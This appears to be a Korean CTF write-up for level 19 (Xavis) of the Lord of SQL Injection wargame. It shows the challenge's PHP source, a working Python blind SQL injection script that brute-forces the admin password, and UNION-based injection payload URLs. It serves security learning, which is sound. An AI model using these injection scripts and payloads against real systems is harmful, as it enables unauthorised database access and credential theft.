# Lord of SQL Injection No.19 Xavis

Xavis 문제는 Blind SQL Injection의 탐색 범위를 늘려 결과값을 찾아낼 수 있도록 유도한 문제이다.

## 소스 코드

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

```php
 if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```
`$_GET`방식으로 입력받은 `pw`에 `prob`, `_`, `.`, `(`, `)`가 포함되어 있으면 `No Hack ~_~`을 출력시킨 후 문제풀이에 실패하게 된다.

```php
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe");
```
`regex`와 `like` 함수를 필터링시켰다.

`regex` 는 정규식과 관련된 함수인데, `regexp`, `regexp_like` 등이 있다.
`like` 함수는 이전에 `=`을 우회하기 위하여 사용한 함수이다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
```

문제 내에 존재하는 `pw`값과 `$_GET` 방식으로 입력받은 `pw`값이 일피하면 문제풀이에 성공하게 된다.

## Solution

이전 문제들과는 달리 `regex`, `like` 외에는 별 다른 필터링이 되지 않았기 때문에 초반에 사용하던 기본 코드를 사용해도 좋다고 생각했다.

하지만 `pwlen`을 구하기 위해 지정했던 범위가 1~10 이였으나, 코드를 실행시켜도 찾아지는 값이 없었다.
그렇게 때문에 `pwlen`을 찾는 범위를 1~10에서 1~50으로 늘렸다.

ASCII 값을 대입하여 `pw`를 찾는 반복문의 범위도 원래는 `ord('0')`부터 `ord('z')` 로 지정해주었으나 찾아지는 값이 없어 무한루프가 돌았기 때문에 범위를 1~1000 으로 지정해주었다.

아래는 문제풀이를 하기위해 사용하였던 코드이다. 수정할 부분이 많아 문제가 많을수도 있다.

```python
import urllib.request
from urllib.parse import quote

result = ""
hex_result = "0x"
pwlen = 0
url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="

for i in range(1, 50):
    add_url = "' or id='admin' and length(pw)={} -- ;".format(str(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=67rse542trun7sp0rtrd5pp612")
    res = urllib.request.urlopen(re)

    print("Finding Password Length.. => {}".format(i))

    if str(res.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found it! Password Length => {}".format(pwlen))
        break

for i in range(1, pwlen + 1):
    for j in range(1, 1000):
        if i == 2 or i == 4:
            j += 40
        add_url = "' || id='admin' and ord(MID(pw,{0},1))='{1}' -- ;".format(i, j)
        print("Matching.. - [{0}] // Result = [{1}] // Hex_Result = [{2}]".format(chr(j), result, hex_result))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent", "Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=67rse542trun7sp0rtrd5pp612")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            char = chr(j)
            hex_result += str(hex(j)).replace('0x', '')
            result += chr(j)
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : {0} (Hex : {1})".format(result, hex_result))
```

코드를 실행시키면 `pwlen`은 40이 나오며, `pw`값은 `¸ùÅ°ÆÐÄ¡¤»`로 괴상한 값이 나오게 된다.
이 `pw`를 그대로 URL에 대입하거나 Hex 값으로 변환한 `0xb8f9c5b0c6d0c4a1a4bb`를 `pw`값으로 넣어주면 문제 풀이에 성공하게 된다.

---

## 추가 문제 풀이

`Blind SQL Injection`을 하지 않고 `xavis` 문제를 해결하는 방법을 추가합니다.

`xavis` 문제의 url에 직접 `union`과 변수를 이용하여 `pw`값을 출력시키는 방법이 존재한다.

```
http://los.eagle-jump.org/xavis_****.php
```

위의 URL에 `?pw='`로 `pw`문을 임의로 닫은 후

```
http://los.eagle-jump.org/xavis_****.php?pw='
```

`or`을 이용하여 임의로 `query`문을 대입한다.

`db` 내에 있는 `pw` 값을 변수에 담아 저장한 후 `union`을 통해 추가한다.

```
http://los.eagle-jump.org/xavis_****.php?pw=' or (select @a:=pw) union select @a -- ;
```

`a` 라는 변수에 `pw` 값을 대입한 후 `union`을 통해 `pw` 값을 출력시키게 한다.

위와 같이 `Union SQL Injection` 을 진행해보면,

```
Hello fnfmfkalfnfmffnfmf
```

와 같이 `db`의 `pw` 값이 출력되는 것을 확인할 수 있다.

이는 현재 조건문을 걸어주지 않고 변수에 담은 임의의 값이기 때문에, `where` 절을 이용하여 `id`가 `admin`일 때의 `pw` 값을 변수에 담아 출력하도록 하면 된다.

```
http://los.eagle-jump.org/xavis_****.php?pw=' or (select @a:=pw where id='admin') union select @a -- ;
```

위처럼 `Union SQL Injection`을 진행하면,

```
Hello ¸ùÅ°ÆÐÄ¡¤»
```
을 출력하게 되므로, `id`가 `admin`일 때의 `pw` 값은 `¸ùÅ°ÆÐÄ¡¤»` 임을 알 수 있게 된다.

```
http://los.eagle-jump.org/xavis_****.php?pw=¸ùÅ°ÆÐÄ¡¤»
```

`pw`에 `¸ùÅ°ÆÐÄ¡¤»` 을 대입하면 문제 풀이에 성공하게 된다.